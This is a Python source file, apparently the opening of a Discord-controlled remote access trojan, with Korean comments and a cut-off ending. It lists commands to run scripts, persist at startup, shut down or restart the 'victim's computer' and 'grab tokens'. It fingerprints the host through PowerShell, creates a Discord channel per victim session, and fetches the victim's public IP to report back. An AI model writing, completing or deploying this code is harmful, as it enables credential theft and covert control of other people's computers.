commands = "\n".join([ # 명령어 목록
    ">help - help command",
    ">ls - show directory",
    ">shell - execute script",
    ">run <filename> - run an file",
    ">startup - add to startup",
    ">shutdown - shutdown victim's computer",
    ">restart - restart victim's computer",
    ">token - grab tokens",
    ">exit - exit the program",
])

import discord
import os, sys
import re, json
import shutil
import pyautogui
import requests, subprocess

def res_path(relative_path):
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

def get_processor():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]

def get_gpu():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_VideoController -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]

def get_os():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_OperatingSystem -ComputerName. | Select-Object -Property Caption"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]

try:
    config = json.loads(open("bot_conf.json", "r").read())
except:
    config = json.loads(
        open(res_path("bot_conf.json").read())
    )

intents = discord.Intents.all()
bot = discord.Client(intents=intents)
session_id = os.urandom(8).hex() # 해킹에 성공했을 때 만들어지는 피해자를 목록별로 구분하기 위한 세션
token = config["token"]
guild_id = config["guild_id"]

@bot.event
async def on_ready():
    guild = bot.get_guild(int(guild_id))
    channel = await guild.create_text_channel(session_id)
    ip = requests.get("https://api.ipify.org").text
    